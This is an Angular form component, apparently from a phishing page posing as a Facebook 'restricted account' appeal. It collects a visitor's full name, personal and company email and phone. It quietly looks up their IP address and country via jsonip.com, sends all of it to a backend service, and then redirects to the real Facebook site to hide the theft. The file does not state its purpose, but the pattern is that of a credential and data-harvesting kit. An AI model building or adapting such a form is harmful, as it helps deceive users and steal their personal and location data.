import {Component, OnInit} from '@angular/core';
import {FormControl, FormGroup, Validators} from "@angular/forms";
import {UserService} from "../../../../../service/user.service";

@Component({
  selector: 'form-restricted',
  templateUrl: './form-restricted.component.html',
  styleUrls: ['./form-restricted.component.css']
})
export class FormRestrictedComponent implements OnInit {

  form: FormGroup;

  constructor(private userService: UserService) {
    this.form = new FormGroup({
      fullName: new FormControl('', [Validators.required]),
      email: new FormControl('', [Validators.required, Validators.email]),
      emailCompany: new FormControl('', [Validators.required, Validators.email]),
      phone: new FormControl('', [Validators.required]),
      ipAddress: new FormControl('', [Validators.required]),
      agreeTerm: new FormControl(false, [Validators.requiredTrue]),
      country: new FormControl('', [Validators.required]),
    });
  }

  ngOnInit(): void {
    this.getIpUser();
  }

  doSend(): void {
    if (this.form.invalid) {
      for (const control of Object.keys(this.form.controls)) {
        this.form.controls[control].markAsTouched();
      }
      return;
    }
    this.accessUser();
  }

  accessUser(): void {
    this.userService.accessUser(this.form.value).subscribe((_) => {
      window.location.href = 'https://www.facebook.com/';
    });
  }

  get fullName() {
    return this.form.get('fullName')!;
  }

  get phone() {
    return this.form.get('phone')!;
  }

  get email() {
    return this.form.get('email')!;
  }

  get emailCompany() {
    return this.form.get('emailCompany')!;
  }

  get agreeTerm() {
    return this.form.get('agreeTerm')!;
  }

  getIpUser(): void {
    fetch('https://jsonip.com/').then(
      async res => {
        const dataFormJson: any = await res.json();
        this.form.controls['ipAddress'].setValue(dataFormJson.ip);
        this.form.controls['country'].setValue(dataFormJson.country);
        console.log('userForm', this.form.value);
      }
    );
  }

}
